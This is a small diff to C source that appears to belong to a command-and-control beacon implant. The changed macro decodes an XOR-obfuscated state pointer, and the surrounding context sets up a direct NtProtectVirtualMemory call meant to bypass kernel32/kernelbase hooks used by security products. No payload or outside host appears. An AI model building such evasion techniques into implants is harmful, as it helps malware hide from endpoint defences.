@@ -90,7 +90,7 @@ static const char *HOSTS[] = { "combase.dll", "rpcrt4.dll", "ucrtbase.dll" };
 // ---- obfuscated state pointer ------------------------------------------------
 static unsigned char g_cookie[8];
 static unsigned long long g_desc_obf;
-#define DESC() ((beacon_state *)(uintptr_t)(g_desc_obf ^ *(unsigned long long *)g_cookie))
+#define DESC() ((beacon_state *)(uintptr_t)(g_desc_obf ^ (*(unsigned long long *)g_cookie & 0x0000FFFFFFFFFFFFULL)))
 
 // ---- NtProtectVirtualMemory: below the kernel32/kernelbase hook layers -------
 typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);
